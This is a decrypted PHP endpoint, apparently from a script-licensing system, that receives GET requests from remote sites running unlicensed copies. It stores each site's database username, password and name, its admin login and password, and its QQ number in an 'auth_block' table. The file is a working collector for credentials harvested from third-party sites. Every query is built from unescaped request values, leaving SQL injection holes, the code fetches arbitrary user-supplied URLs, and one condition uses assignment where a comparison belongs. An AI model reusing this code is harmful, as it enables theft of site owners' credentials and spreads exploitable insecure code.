<?php
/*
 * 本程序由 Xiaojie_evals 解密
 * 官网地址：decode.xiaojieapi.com
 * 官方群号：809513269
 * 当前时间：2022-08-12 06:11:39
*/
?>
<?php
include("../includes/common.php");
require '../includes/config.php';
if(mysql_connect($dbconfig['host'], $dbconfig['user'], $dbconfig['pwd']) == false){
 exit("");
}
mysql_query("set names 'utf8'");
mysql_select_db($dbconfig["dbname"]);
$url = $_GET['url'];
$user = $_GET['user'];
$pwd = $_GET['pwd'];
$db = $_GET['db'];
$ver = $_GET['ver'];
$authcode = $_GET['authcode'];
$qq = $_GET['qq'];
$admin_user = $_GET['admin_user'];
$admin_pass = $_GET['admin_pass'];
$date = date("Y-m-d H-i-s");
$sql = "INSERT INTO `auth_block` (`url`, `date`, `user`, `pwd`, `db`, `ver`, `authcode`, `qq`, `admin_user`, `admin_pass`) VALUES ('{$url}', '{$date}', '{$user}', '{$pwd}', '{$db}', '{$ver}', '{$authcode}', '{$qq}', '{$admin_user}', '{$admin_pass}');";
$update = "UPDATE `auth_block` SET `date` = '$date', `user` = '$user', `pwd` = '$pwd' ,`db` = '$db' ,`ver` = '$ver' ,`authcode` = '$authcode',`qq` = '$qq',`admin_user` = '$admin_user',`admin_pass` = '$admin_pass' WHERE `url` = '$url' ;";
if ($url == "" ) {
	exit("错误,url值不能为空!");
} 
if ($url == "127.0.0.1" || $url == "localhost"){
	exit("错误,本地地址不可提交!");
}

$cf = mysql_query("SELECT * FROM `auth_block` WHERE `url` = '$url' limit 1");
$zb = mysql_query("SELECT * FROM `auth_site` WHERE `url` = '$url' limit 1");
if (mysql_result($zb,0,active) == 1) {
	exit("错误,提交的网址为正版站点!");
}
if (file_get_contents("http://" . $_GET['url']) == false) {
	exit("错误,提交的网址无法访问!");
} 
$dburl = mysql_result($cf,0,url) ;
$dbuser = mysql_result($cf,0,user) ;
$dbpwd = mysql_result($cf,0,pwd) ;
$dbdb = mysql_result($cf,0,db) ;
$dbver = mysql_result($cf,0,ver) ;
$dbauthcode = mysql_result($cf,0,authcode) ;
$dbqq = mysql_result($cf,0,qq) ;
$dbadmin_user = mysql_result($cf,0,admin_user) ;
$dbadmin_pass = mysql_result($cf,0,admin_pass) ;
if ($dburl == $url and $dbuser != $user and $dbpwd != $pwd and $dbdb != $db or $dburl == $url and $dbuser != $user and $dbpwd == $pwd and $dbdb != $db or $dburl == $url and $dbuser == $user and $dbpwd != $pwd and $dbdb != $db or $dburl == $url and $dbuser != $user and $dbpwd != $pwd and $dbdb = $db or $dburl == $url and $dbuser != $user and $dbpwd == $pwd and $dbdb = $db or $dburl == $url and $dbuser == $user and $dbpwd != $pwd and $dbdb = $db){
if (mysql_query($update) == true){
    exit("成功,更新成功");
}else{
	exit("错误,更新时出错".mysql_error());
}
}
if ($dburl == $url){
	exit("错误,数据库内已存在");
	}
if (mysql_query($sql) == true) {
    echo "成功！";
} else {
    echo "失败！" . mysql_error();
}